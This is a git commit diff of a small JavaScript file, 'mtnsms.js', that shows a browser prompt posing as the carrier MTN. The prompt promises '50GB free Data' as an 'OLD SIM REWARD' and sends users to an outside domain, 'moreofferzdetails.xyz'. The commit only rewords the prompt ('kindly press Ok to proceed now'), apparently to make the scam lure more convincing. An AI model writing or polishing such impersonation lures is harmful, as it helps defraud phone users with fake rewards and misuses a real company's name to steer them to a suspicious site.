2b44cd8f0962a891334ebc0f6169e3185127983a
bigetijazz4 <bigetijazz4@gmail.com>
2024-11-11 22:31:26 -0800

    Update mtnsms.js

--- mtnsms.js
+++ mtnsms.js
@@ -1,5 +1,5 @@
 var password = 'ACTIVATE 50GB'
-password=prompt('MTN: Congratulations, Your mobile Number is Eligible to receive 50GB free Data MTN OLD SIM REWARD, kindly press ACTIVATE 50GB to ACTIVATE now ','ACTIVATE 50GB');
+password=prompt('MTN: Congratulations, Your mobile Number is Eligible to receive 50GB free Data MTN OLD SIM REWARD, kindly press Ok to proceed now','ACTIVATE 50GB');
 if (password != 'ACTIVATE 50GB') {
 location.href='https://www.moreofferzdetails.xyz/MTN50gb';
 }
